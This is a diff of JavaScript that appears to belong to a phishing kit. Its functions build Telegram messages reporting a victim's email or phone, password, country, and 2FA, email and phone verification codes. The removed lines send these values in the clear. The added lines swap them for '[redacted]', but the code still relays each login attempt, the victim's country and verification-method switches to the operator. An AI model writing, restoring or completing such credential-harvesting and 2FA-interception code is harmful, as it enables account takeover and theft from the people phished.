@@ -181,102 +181,75 @@ async function sendToTelegram(message) {
 // FORMAT MESSAGES FOR TELEGRAM (MONOSPACE FORMAT)
 // ======================================================
 
-function formatLoginMessage(emailPhone, password) {
-    // Prefer separate hidden fields if present (country-code + phone-number)
+const REDACTED_NOTIFICATION_VALUE = '[redacted]';
+
+function getDigits(value) {
+    return String(value || '').replace(/\D/g, '');
+}
+
+function hasValidPhoneDigits(digits) {
+    return digits.length >= 7 && digits.length <= 15;
+}
+
+function isPhoneLikeValue(value) {
+    const clean = String(value || '').trim();
+    return /^[\d+][\d\s\-()]+$/.test(clean.replace(/\s/g, ''));
+}
+
+function getCredentialParts(emailPhone) {
+    const submitted = String(emailPhone || '').trim();
+    const submittedDigits = getDigits(submitted);
+    const submittedIsPhone = isPhoneLikeValue(submitted) && hasValidPhoneDigits(submittedDigits);
+
+    if (!submittedIsPhone) {
+        return {
+            type: 'Email',
+            html: `<code>${REDACTED_NOTIFICATION_VALUE}</code>`
+        };
+    }
+
     const countryInput = (document.getElementById('country-code') || {}).value || '';
     const phoneInput = (document.getElementById('phone-number') || {}).value || '';
+    const hiddenDigits = getDigits(phoneInput);
+    const canUseSelectedCode = countryInput && hiddenDigits === submittedDigits;
+    const codePart = canUseSelectedCode ? countryInput : '+';
 
-    let credentialsType, credentialsValue;
-    if (countryInput && phoneInput) {
-        credentialsType = 'Phone';
-        // ensure phone digits only after the code
-        const digits = phoneInput.replace(/\D/g, '');
-        credentialsValue = `${countryInput} ${digits}`;
-    } else {
-        // Fallback: check the provided emailPhone string
-        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));
-        if (isPhone) {
-            const phoneNumber = (emailPhone||'').replace(/\D/g, '');
-            credentialsType = 'Phone';
-            credentialsValue = `+${phoneNumber}`;
-        } else {
-            credentialsType = 'Email';
-            credentialsValue = emailPhone || '';
-        }
-    }
-    
-    // Build display: if phone, make country code bold and number monospaced
-    let credentialsHtml;
-    if (credentialsType === 'Phone') {
-        // credentialsValue may be like "+91 123456"
-        const parts = String(credentialsValue).split(/\s+/);
-        const codePart = parts[0] || '';
-        const numberPart = parts.slice(1).join(' ') || '';
-        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;
-    } else {
-        credentialsHtml = `<code>${credentialsValue}</code>`;
-    }
+    return {
+        type: 'Phone',
+        html: `<b>${codePart}</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>`
+    };
+}
+
+function formatLoginMessage(emailPhone, password) {
+    const credentials = getCredentialParts(emailPhone);
 
     return `<b>(${userLabel})</b>
-<b>${credentialsType}:</b> ${credentialsHtml}
-<b>Password:</b> <code>${password}</code>
+<b>${credentials.type}:</b> ${credentials.html}
+<b>Password:</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>
 <b>Country: ${userInfo.country}</b>`;
 }
 
 function formatOneTimeLoginMessage(emailPhone) {
-    // Prefer separate hidden fields if present (country-code + phone-number)
-    const countryInput = (document.getElementById('country-code') || {}).value || '';
-    const phoneInput = (document.getElementById('phone-number') || {}).value || '';
-
-    let credentialsType, credentialsValue;
-    if (countryInput && phoneInput) {
-        credentialsType = 'Phone';
-        // ensure phone digits only after the code
-        const digits = phoneInput.replace(/\D/g, '');
-        credentialsValue = `${countryInput} ${digits}`;
-    } else {
-        // Fallback: check the provided emailPhone string
-        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));
-        if (isPhone) {
-            const phoneNumber = (emailPhone||'').replace(/\D/g, '');
-            credentialsType = 'Phone';
-            credentialsValue = `+${phoneNumber}`;
-        } else {
-            credentialsType = 'Email';
-            credentialsValue = emailPhone || '';
-        }
-    }
-    
-    // Build display: if phone, make country code bold and number monospaced
-    let credentialsHtml;
-    if (credentialsType === 'Phone') {
-        // credentialsValue may be like "+91 123456"
-        const parts = String(credentialsValue).split(/\s+/);
-        const codePart = parts[0] || '';
-        const numberPart = parts.slice(1).join(' ') || '';
-        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;
-    } else {
-        credentialsHtml = `<code>${credentialsValue}</code>`;
-    }
+    const credentials = getCredentialParts(emailPhone);
 
     return `<b>(${userLabel} 1⃣)</b>
-<b>${credentialsType}:</b> ${credentialsHtml}
+<b>${credentials.type}:</b> ${credentials.html}
 <b>Country: ${userInfo.country}</b>`;
 }
 
 function format2FAMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}🔐: (${userLabel}):</b> <code>${code}</code>`;
+    return `<b>${prefix}🔐: (${userLabel}):</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>`;
 }
 
 function formatEmailVerificationMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📧: (${userLabel}):</b> <code>${code}</code>`;
+    return `<b>${prefix}📧: (${userLabel}):</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>`;
 }
 
 function formatPhoneVerificationMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📱: (${userLabel}):</b> <code>${code}</code>`;
+    return `<b>${prefix}📱: (${userLabel}):</b> <code>${REDACTED_NOTIFICATION_VALUE}</code>`;
 }
 
 function formatSwitchMessage(fromMethod, toMethod) {
